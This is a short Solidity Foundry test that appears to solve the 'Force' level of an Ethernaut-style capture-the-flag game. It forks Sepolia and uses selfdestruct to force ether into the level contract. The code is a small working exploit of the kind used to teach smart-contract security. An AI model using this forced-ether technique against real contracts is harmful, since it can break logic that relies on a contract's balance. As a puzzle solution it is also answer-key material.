// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/levels/07-Force/Force.sol";

contract ContractTest is Test {
 
    Force level7 = Force(payable(0xf541649Ac6C05331CcCfEFe164baa3EbB3e112b8));

    function setUp() public {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    vm.createSelectFork(vm.rpcUrl("sepolia"));
    }

    function testExploit7() public {

      selfdestruct(payable(address(level7)));

    }
  receive() external payable {}
}